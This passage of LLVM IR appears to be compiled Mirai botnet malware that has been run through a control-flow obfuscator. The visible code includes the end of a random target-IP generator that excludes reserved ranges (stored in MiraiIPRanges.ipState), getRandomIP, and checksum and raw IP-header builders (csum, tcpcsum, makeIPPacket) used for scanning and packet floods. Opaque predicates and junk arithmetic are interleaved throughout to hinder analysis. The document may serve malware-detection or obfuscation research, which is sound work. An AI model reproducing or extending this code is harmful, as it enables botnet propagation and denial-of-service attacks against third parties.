  %391 = phi i1 [ true, %382 ], [ true, %originalBBpart256 ], [ true, %358 ], [ true, %originalBBpart252 ], [ true, %334 ], [ true, %originalBBpart248 ], [ true, %originalBBpart244 ], [ true, %290 ], [ true, %originalBBpart240 ], [ true, %originalBBpart236 ], [ true, %246 ], [ true, %originalBBpart232 ], [ %389, %386 ]
  br label %392

; <label>:392:                                    ; preds = %390, %originalBBpart228, %202, %190, %182, %170, %originalBBpart216, %originalBBpart212, %originalBBpart28, %originalBBpart24, %originalBBpart2, %22, %18, %14
  %393 = phi i1 [ true, %originalBBpart228 ], [ true, %202 ], [ true, %190 ], [ true, %182 ], [ true, %170 ], [ true, %originalBBpart216 ], [ true, %originalBBpart212 ], [ true, %originalBBpart28 ], [ true, %originalBBpart24 ], [ true, %originalBBpart2 ], [ true, %22 ], [ true, %18 ], [ true, %14 ], [ %391, %390 ]
  %394 = load i32, i32* @x.57
  %395 = load i32, i32* @y.58
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %392
  %402 = load i32, i32* @x.57
  %403 = load i32, i32* @y.58
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %393, label %410, label %423

; <label>:410:                                    ; preds = %originalBBpart260
  %411 = call i32 @rand() #5
  %412 = srem i32 %411, 223
  %413 = trunc i32 %412 to i8
  store i8 %413, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %414 = call i32 @rand() #5
  %415 = srem i32 %414, 255
  %416 = trunc i32 %415 to i8
  store i8 %416, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %417 = call i32 @rand() #5
  %418 = srem i32 %417, 255
  %419 = trunc i32 %418 to i8
  store i8 %419, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %420 = call i32 @rand() #5
  %421 = srem i32 %420, 255
  %422 = trunc i32 %421 to i8
  store i8 %422, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:423:                                    ; preds = %originalBBpart260
  %424 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %424, i8 0, i64 16, i32 16, i1 false)
  %425 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %426 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %427 = zext i8 %426 to i32
  %428 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %429 = zext i8 %428 to i32
  %430 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %431 = zext i8 %430 to i32
  %432 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  %433 = zext i8 %432 to i32
  %434 = call i32 (i8*, i8*, ...) @szprintf(i8* %425, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.487, i32 0, i32 0), i32 %427, i32 %429, i32 %431, i32 %433)
  %435 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %436 = call i32 @inet_addr(i8* %435) #5
  ret i32 %436

originalBBalteredBB:                              ; preds = %originalBB, %26
  %437 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %438 = zext i8 %437 to i32
  %439 = icmp eq i32 %438, 15
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %440 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %441 = zext i8 %440 to i32
  %442 = icmp eq i32 %441, 16
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %66
  %443 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %444 = zext i8 %443 to i32
  %445 = icmp eq i32 %444, 56
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %86
  %446 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %447 = zext i8 %446 to i32
  %448 = icmp eq i32 %447, 10
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %110
  %449 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %450 = zext i8 %449 to i32
  %451 = icmp eq i32 %450, 168
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %130
  %452 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %453 = zext i8 %452 to i32
  %454 = icmp eq i32 %453, 172
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %150
  %455 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %456 = zext i8 %455 to i32
  %457 = icmp sge i32 %456, 16
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %206
  %458 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %459 = zext i8 %458 to i32
  %460 = icmp eq i32 %459, 224
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %226
  %461 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %462 = zext i8 %461 to i32
  %463 = icmp eq i32 %462, 6
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %250
  %464 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %465 = zext i8 %464 to i32
  %466 = icmp eq i32 %465, 11
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %270
  %467 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %468 = zext i8 %467 to i32
  %469 = icmp eq i32 %468, 21
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %294
  %470 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %471 = zext i8 %470 to i32
  %472 = icmp eq i32 %471, 26
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %314
  %473 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %474 = zext i8 %473 to i32
  %475 = icmp eq i32 %474, 28
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %338
  %476 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %477 = zext i8 %476 to i32
  %478 = icmp eq i32 %477, 30
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %362
  %479 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %480 = zext i8 %479 to i32
  %481 = icmp eq i32 %480, 55
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %392
  br label %originalBB58
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = load i32, i32* @x.59
  %3 = load i32, i32* @y.60
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %13 = call i32 @ntohl(i32 %12) #10
  %14 = load i32, i32* %10, align 4
  %15 = and i32 %13, %14
  store i32 %15, i32* %11, align 4
  %16 = load i32, i32* %11, align 4
  %17 = call i32 @rand_cmwc()
  %18 = load i32, i32* %10, align 4
  %19 = xor i32 %18, -1
  %20 = and i32 %17, %19
  %21 = xor i32 %16, %20
  %22 = load i32, i32* @x.59
  %23 = load i32, i32* @y.60
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %21

originalBBalteredBB:                              ; preds = %originalBB, %1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  store i32 %0, i32* %30, align 4
  %32 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %33 = call i32 @ntohl(i32 %32) #10
  %34 = load i32, i32* %30, align 4
  %_ = shl i32 %33, %34
  %_1 = sub i32 0, %33
  %gen = add i32 %_1, %34
  %_2 = sub i32 %33, %34
  %gen3 = mul i32 %_2, %34
  %_4 = shl i32 %33, %34
  %_5 = sub i32 0, %33
  %gen6 = add i32 %_5, %34
  %_7 = shl i32 %33, %34
  %35 = and i32 %33, %34
  store i32 %35, i32* %31, align 4
  %36 = load i32, i32* %31, align 4
  %37 = call i32 @rand_cmwc()
  %38 = load i32, i32* %30, align 4
  %_8 = sub i32 %38, -1
  %gen9 = mul i32 %_8, -1
  %_10 = shl i32 %38, -1
  %_11 = sub i32 0, %38
  %gen12 = add i32 %_11, -1
  %_13 = sub i32 %38, -1
  %gen14 = mul i32 %_13, -1
  %39 = xor i32 %38, -1
  %_15 = sub i32 0, %37
  %gen16 = add i32 %_15, %39
  %_17 = sub i32 %37, %39
  %gen18 = mul i32 %_17, %39
  %_19 = sub i32 %37, %39
  %gen20 = mul i32 %_19, %39
  %_21 = shl i32 %37, %39
  %_22 = shl i32 %37, %39
  %_23 = shl i32 %37, %39
  %_24 = sub i32 0, %37
  %gen25 = add i32 %_24, %39
  %40 = and i32 %37, %39
  %_26 = sub i32 0, %36
  %gen27 = add i32 %_26, %40
  %_28 = shl i32 %36, %40
  %_29 = sub i32 0, %36
  %gen30 = add i32 %_29, %40
  %_31 = sub i32 %36, %40
  %gen32 = mul i32 %_31, %40
  %_33 = sub i32 0, %36
  %gen34 = add i32 %_33, %40
  %_35 = sub i32 0, %36
  %gen36 = add i32 %_35, %40
  %41 = xor i32 %36, %40
  br label %originalBB
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = load i32, i32* @x.61
  %4 = load i32, i32* @y.62
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i16*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  store i16* %0, i16** %11, align 8
  store i32 %1, i32* %12, align 4
  store i64 0, i64* %13, align 8
  %14 = load i32, i32* @x.61
  %15 = load i32, i32* @y.62
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %41, %originalBBpart2
  %23 = load i32, i32* @x.61
  %24 = load i32, i32* @y.62
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %22
  %31 = load i32, i32* %12, align 4
  %32 = icmp sgt i32 %31, 1
  %33 = load i32, i32* @x.61
  %34 = load i32, i32* @y.62
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %32, label %41, label %50

; <label>:41:                                     ; preds = %originalBBpart24
  %42 = load i16*, i16** %11, align 8
  %43 = getelementptr inbounds i16, i16* %42, i32 1
  store i16* %43, i16** %11, align 8
  %44 = load i16, i16* %42, align 2
  %45 = zext i16 %44 to i64
  %46 = load i64, i64* %13, align 8
  %47 = add i64 %46, %45
  store i64 %47, i64* %13, align 8
  %48 = load i32, i32* %12, align 4
  %49 = sub nsw i32 %48, 2
  store i32 %49, i32* %12, align 4
  br label %22

; <label>:50:                                     ; preds = %originalBBpart24
  %51 = load i32, i32* %12, align 4
  %52 = icmp sgt i32 %51, 0
  br i1 %52, label %53, label %60

; <label>:53:                                     ; preds = %50
  %54 = load i16*, i16** %11, align 8
  %55 = bitcast i16* %54 to i8*
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i64
  %58 = load i64, i64* %13, align 8
  %59 = add i64 %58, %57
  store i64 %59, i64* %13, align 8
  br label %60

; <label>:60:                                     ; preds = %53, %50
  br label %61

; <label>:61:                                     ; preds = %originalBBpart236, %60
  %62 = load i32, i32* @x.61
  %63 = load i32, i32* @y.62
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %61
  %70 = load i64, i64* %13, align 8
  %71 = lshr i64 %70, 16
  %72 = icmp ne i64 %71, 0
  %73 = load i32, i32* @x.61
  %74 = load i32, i32* @y.62
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart210, label %originalBB6alteredBB

originalBBpart210:                                ; preds = %originalBB6
  br i1 %72, label %81, label %103

; <label>:81:                                     ; preds = %originalBBpart210
  %82 = load i32, i32* @x.61
  %83 = load i32, i32* @y.62
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %81
  %90 = load i64, i64* %13, align 8
  %91 = and i64 %90, 65535
  %92 = load i64, i64* %13, align 8
  %93 = lshr i64 %92, 16
  %94 = add i64 %91, %93
  store i64 %94, i64* %13, align 8
  %95 = load i32, i32* @x.61
  %96 = load i32, i32* @y.62
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart236, label %originalBB12alteredBB

originalBBpart236:                                ; preds = %originalBB12
  br label %61

; <label>:103:                                    ; preds = %originalBBpart210
  %104 = load i64, i64* %13, align 8
  %105 = xor i64 %104, -1
  %106 = trunc i64 %105 to i16
  ret i16 %106

originalBBalteredBB:                              ; preds = %originalBB, %2
  %107 = alloca i16*, align 8
  %108 = alloca i32, align 4
  %109 = alloca i64, align 8
  store i16* %0, i16** %107, align 8
  store i32 %1, i32* %108, align 4
  store i64 0, i64* %109, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %22
  %110 = load i32, i32* %12, align 4
  %111 = icmp sgt i32 %110, 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %61
  %112 = load i64, i64* %13, align 8
  %_ = sub i64 %112, 16
  %gen = mul i64 %_, 16
  %_7 = shl i64 %112, 16
  %_8 = shl i64 %112, 16
  %113 = lshr i64 %112, 16
  %114 = icmp ne i64 %113, 0
  br label %originalBB6

originalBB12alteredBB:                            ; preds = %originalBB12, %81
  %115 = load i64, i64* %13, align 8
  %_13 = sub i64 %115, 65535
  %gen14 = mul i64 %_13, 65535
  %_15 = sub i64 %115, 65535
  %gen16 = mul i64 %_15, 65535
  %_17 = sub i64 %115, 65535
  %gen18 = mul i64 %_17, 65535
  %_19 = sub i64 %115, 65535
  %gen20 = mul i64 %_19, 65535
  %116 = and i64 %115, 65535
  %117 = load i64, i64* %13, align 8
  %_21 = shl i64 %117, 16
  %_22 = sub i64 %117, 16
  %gen23 = mul i64 %_22, 16
  %_24 = shl i64 %117, 16
  %118 = lshr i64 %117, 16
  %_25 = sub i64 %116, %118
  %gen26 = mul i64 %_25, %118
  %_27 = sub i64 %116, %118
  %gen28 = mul i64 %_27, %118
  %_29 = sub i64 %116, %118
  %gen30 = mul i64 %_29, %118
  %_31 = sub i64 0, %116
  %gen32 = add i64 %_31, %118
  %_33 = sub i64 0, %116
  %gen34 = add i64 %_33, %118
  %119 = add i64 %116, %118
  store i64 %119, i64* %13, align 8
  br label %originalBB12
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = load i32, i32* @x.65
  %7 = load i32, i32* @y.66
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca %struct.iphdr*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8, align 1
  %18 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %14, align 8
  store i32 %1, i32* %15, align 4
  store i32 %2, i32* %16, align 4
  store i8 %3, i8* %17, align 1
  store i32 %4, i32* %18, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %20 = bitcast %struct.iphdr* %19 to i8*
  %21 = load i8, i8* %20, align 4
  %22 = and i8 %21, -16
  %23 = or i8 %22, 5
  store i8 %23, i8* %20, align 4
  %24 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %25 = bitcast %struct.iphdr* %24 to i8*
  %26 = load i8, i8* %25, align 4
  %27 = and i8 %26, 15
  %28 = or i8 %27, 64
  store i8 %28, i8* %25, align 4
  %29 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %30 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %29, i32 0, i32 1
  store i8 0, i8* %30, align 1
  %31 = load i32, i32* %18, align 4
  %32 = sext i32 %31 to i64
  %33 = add i64 20, %32
  %34 = trunc i64 %33 to i16
  %35 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 2
  store i16 %34, i16* %36, align 2
  %37 = call i32 @rand_cmwc()
  %38 = trunc i32 %37 to i16
  %39 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %40 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %39, i32 0, i32 3
  store i16 %38, i16* %40, align 4
  %41 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %42 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %41, i32 0, i32 4
  store i16 0, i16* %42, align 2
  %43 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 5
  store i8 -1, i8* %44, align 4
  %45 = load i8, i8* %17, align 1
  %46 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 6
  store i8 %45, i8* %47, align 1
  %48 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 7
  store i16 0, i16* %49, align 2
  %50 = load i32, i32* %16, align 4
  %51 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 8
  store i32 %50, i32* %52, align 4
  %53 = load i32, i32* %15, align 4
  %54 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %55 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %54, i32 0, i32 9
  store i32 %53, i32* %55, align 4
  %56 = load i32, i32* @x.65
  %57 = load i32, i32* @y.66
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %64 = alloca %struct.iphdr*, align 8
  %65 = alloca i32, align 4
  %66 = alloca i32, align 4
  %67 = alloca i8, align 1
  %68 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %64, align 8
  store i32 %1, i32* %65, align 4
  store i32 %2, i32* %66, align 4
  store i8 %3, i8* %67, align 1
  store i32 %4, i32* %68, align 4
  %69 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %70 = bitcast %struct.iphdr* %69 to i8*
  %71 = load i8, i8* %70, align 4
  %_ = sub i8 %71, -16
  %gen = mul i8 %_, -16
  %_1 = sub i8 %71, -16
  %gen2 = mul i8 %_1, -16
  %_3 = sub i8 %71, -16
  %gen4 = mul i8 %_3, -16
  %_5 = sub i8 0, %71
  %gen6 = add i8 %_5, -16
  %_7 = sub i8 %71, -16
  %gen8 = mul i8 %_7, -16
  %_9 = sub i8 0, %71
  %gen10 = add i8 %_9, -16
  %_11 = shl i8 %71, -16
  %72 = and i8 %71, -16
  %_12 = sub i8 %72, 5
  %gen13 = mul i8 %_12, 5
  %73 = or i8 %72, 5
  store i8 %73, i8* %70, align 4
  %74 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %75 = bitcast %struct.iphdr* %74 to i8*
  %76 = load i8, i8* %75, align 4
  %_14 = sub i8 0, %76
  %gen15 = add i8 %_14, 15
  %_16 = sub i8 0, %76
  %gen17 = add i8 %_16, 15
  %_18 = shl i8 %76, 15
  %77 = and i8 %76, 15
  %_19 = shl i8 %77, 64
  %_20 = sub i8 %77, 64
  %gen21 = mul i8 %_20, 64
  %_22 = sub i8 %77, 64
  %gen23 = mul i8 %_22, 64
  %78 = or i8 %77, 64
  store i8 %78, i8* %75, align 4
  %79 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %80 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %79, i32 0, i32 1
  store i8 0, i8* %80, align 1
  %81 = load i32, i32* %68, align 4
  %82 = sext i32 %81 to i64
  %_24 = sub i64 0, 20
  %gen25 = add i64 %_24, %82
  %_26 = sub i64 0, 20
  %gen27 = add i64 %_26, %82
  %83 = add i64 20, %82
  %84 = trunc i64 %83 to i16
  %85 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i32 0, i32 2
  store i16 %84, i16* %86, align 2
  %87 = call i32 @rand_cmwc()
  %88 = trunc i32 %87 to i16
  %89 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %90 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %89, i32 0, i32 3
  store i16 %88, i16* %90, align 4
  %91 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %92 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %91, i32 0, i32 4
  store i16 0, i16* %92, align 2
  %93 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %94 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %93, i32 0, i32 5
  store i8 -1, i8* %94, align 4
  %95 = load i8, i8* %67, align 1
  %96 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %97 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %96, i32 0, i32 6
  store i8 %95, i8* %97, align 1
  %98 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %99 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %98, i32 0, i32 7
  store i16 0, i16* %99, align 2
  %100 = load i32, i32* %66, align 4
  %101 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i32 0, i32 8
  store i32 %100, i32* %102, align 4
  %103 = load i32, i32* %65, align 4
  %104 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %105 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %104, i32 0, i32 9
  store i32 %103, i32* %105, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

